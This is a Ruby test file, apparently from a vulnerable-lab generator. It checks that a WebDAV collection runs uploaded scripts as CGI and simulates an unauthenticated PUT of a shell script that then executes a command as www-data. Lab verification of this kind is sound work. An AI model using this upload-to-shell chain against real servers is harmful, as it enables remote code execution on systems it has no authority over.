require 'shellwords'
require_relative '../../../../../lib/post_provision_test'

# Proves the CGI execution half of the WebDAV-upload-to-shell chain: a script
# placed in the writable collection is executed through the mod_actions
# dispatcher (so it needs no execute bit), not served as text.
#
# This enabler reads no facts of its own, so the test discovers the collection
# directory, its URL path and the serving Apache port from the running target.
class WebdavFileUploadCgiTest < PostProvisionTest
  def initialize
    self.module_name = 'webdav_file_upload_cgi'
    self.module_path = get_module_path(__FILE__)
    super
  end

  # {dir:, path:, port:} for the writable WebDAV collection, or nil if not found.
  def discover_webdav
    dir = run_command("find /var/www/webdav -mindepth 1 -maxdepth 1 -type d -user www-data 2>/dev/null | head -1")[:stdout].to_s.strip
    return nil if dir.empty?
    conf = run_command("grep -lE '/var/www/webdav' /etc/apache2/sites-enabled/*.conf /etc/apache2/sites-available/*.conf 2>/dev/null | head -1")[:stdout].to_s.strip
    port = run_command("grep -hoE '<VirtualHost[^>]*:[0-9]+' #{Shellwords.escape(conf)} 2>/dev/null | grep -oE '[0-9]+' | head -1")[:stdout].to_s.strip
    return nil if port.empty?
    { dir: dir, path: File.basename(dir), port: port.to_i }
  end

  # A CGI script (shebang + body) that emits a CGI header then runs `body`.
  def cgi_script(body)
    "#!/bin/sh\nprintf 'Content-Type: text/plain\\r\\n\\r\\n'\n#{body}\n"
  end

  def test_module
    super

    tier(1) do
      test_local_command('mod_cgi enabled in Apache', 'apache2ctl -M 2>/dev/null', 'cgi')
      test_local_command('mod_actions enabled in Apache', 'apache2ctl -M 2>/dev/null', 'actions')
      test_local_command('CGI exec snippet installed',
                         'cat /etc/apache2/conf.d/webdav-cgi-exec.conf 2>/dev/null', 'ExecCGI')
      test_local_command('dispatcher CGI installed and executable',
                         'stat -c "%a" /usr/lib/secgen-dav-cgi-bin/dispatch 2>/dev/null', '755')
    end

    wd = discover_webdav

    tier(2) do
      if wd.nil?
        fail_check('locate WebDAV collection',
                   'no www-data-owned directory under /var/www/webdav, or no vhost port found', tier: 2)
      else
        # A NON-executable (0644) script dropped into the collection must still be
        # run via the dispatcher. If it executes, 6*7 is evaluated to 42; if it is
        # served as text the body contains "6*7" and never "SECGENCGI_42".
        probe = "secgen_cgi_probe_#{rand(100000)}.sh"
        payload = cgi_script('echo SECGENCGI_$((6*7))')
        run_command("printf '%s' #{Shellwords.escape(payload)} > #{Shellwords.escape(wd[:dir])}/#{probe} && chmod 644 #{Shellwords.escape(wd[:dir])}/#{probe}")
        test_http("/#{wd[:path]}/#{probe}", match: 'SECGENCGI_42', port: wd[:port],
                  label: 'uploaded non-executable script runs via the CGI dispatcher', tier: 2)
      end
    end

    # Tier 3: an unauthenticated attacker PUTs a CGI shell into the collection and
    # runs a command through it. Proof is a sentinel the command writes on the
    # target, in /dev/shm (apache2.service has PrivateTmp=true).
    tier(3) do
      resolved = resolve_attacker('CGI shell RCE', nil, nil, 3)
      next unless resolved
      attacker, _attacker_ip, rhost = resolved
      if wd.nil?
        fail_check('CGI shell RCE', 'could not locate the WebDAV collection on the target', tier: 3)
        next
      end

      sentinel_path, scmd = build_sentinel(dir: '/dev/shm')
      shell = "secgen_shell_#{rand(100000)}.sh"
      shell_body = cgi_script(scmd)

      put = http_from_attacker("/#{wd[:path]}/#{shell}", attacker: attacker, rhost: rhost,
                               rport: wd[:port], method: 'PUT', data: shell_body)
      unless [200, 201, 204].include?(put[:status].to_i)
        fail_check('upload CGI shell (unauthenticated PUT)',
                   "PUT returned HTTP #{put[:status]} (#{put[:error]})", tier: 3)
        next
      end

      http_from_attacker("/#{wd[:path]}/#{shell}", attacker: attacker, rhost: rhost,
                         rport: wd[:port], method: 'GET')
      body = read_sentinel(sentinel_path)
      if sentinel_pwned?(body)
        pass_check('CGI shell RCE as www-data',
                   "Uploaded #{shell} by unauth PUT and executed a command#{privilege_note(body)}.", tier: 3)
      else
        fail_check('CGI shell RCE as www-data',
                   'PUT accepted but the uploaded script did not execute (no sentinel).', tier: 3)
      end
    end
  end
end

WebdavFileUploadCgiTest.new.run
